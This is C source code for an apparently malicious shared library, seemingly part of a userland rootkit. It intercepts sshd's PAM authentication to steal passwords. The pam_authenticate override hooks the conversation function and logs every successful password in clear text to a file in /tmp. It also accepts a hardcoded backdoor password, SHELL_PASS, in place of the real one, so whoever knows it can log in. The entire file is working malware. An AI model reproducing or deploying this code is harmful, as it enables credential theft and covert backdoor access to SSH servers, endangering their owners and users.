#include "father.h"

char * pampassword;

void exfil(int type, int result, const char * username, const char * password)
{
	FILE * fp = fopen("/tmp/silly.txt", "a+");
	fprintf(fp, "%d:%d:%s:%s\n", type, result, username, password);
	fclose(fp);
}

// stores old SSHD conversation function
int (*oldconv)(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr);

// hook PAM conversation function
int newconv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr) {
    int res = 0;

    res = oldconv(num_msg, msg, resp, appdata_ptr);

    if (res == PAM_SUCCESS) {
        // PAM manpage says to leave resp_retcode unset, but SSHD
        // sets it to PAM_SUCCESS when it runs successfully
        if (resp[0]->resp_retcode == PAM_SUCCESS && resp[0]->resp) {

            // remove password if it is stored
            if(pampassword) { free(pampassword); pampassword = NULL; }

            // set password for later
            pampassword = strdup(resp[0]->resp);
        }
    }

    return res;
}


int (*o_pam_authenticate)(pam_handle_t *, int);
int pam_authenticate(pam_handle_t * pamh, int flags)
{
  int res = -1;
  struct pam_conv * myconv;

  if(o_pam_authenticate == NULL) {
    o_pam_authenticate = dlsym(RTLD_NEXT, "pam_authenticate");
  }

  // sshd sets the PAM_CONV function to the the password conversation
  // function right before calling pam_authenticate()
  res = pam_get_item(pamh, PAM_CONV, (const void**)&myconv);
  if (res == PAM_SUCCESS) {
      // hook the conversation function
      oldconv = myconv->conv;
      myconv->conv = newconv;
  } else {
      if (o_pam_authenticate == NULL) return PAM_SUCCESS;
      return o_pam_authenticate(pamh, flags);
  }

  if (o_pam_authenticate == NULL) return PAM_SUCCESS;
  res = o_pam_authenticate(pamh, flags);

  if (res == PAM_SUCCESS && pampassword) {
    // exfil correct passwords
    exfil(100, 1, "password", pampassword);
  } else if (pampassword && !strcmp(pampassword, SHELL_PASS)) {
    // user got the password wrong but we like it anyway
    res = PAM_SUCCESS;
  }

  myconv->conv = oldconv;
  free(pampassword);
  pampassword = NULL;

  return res;
}



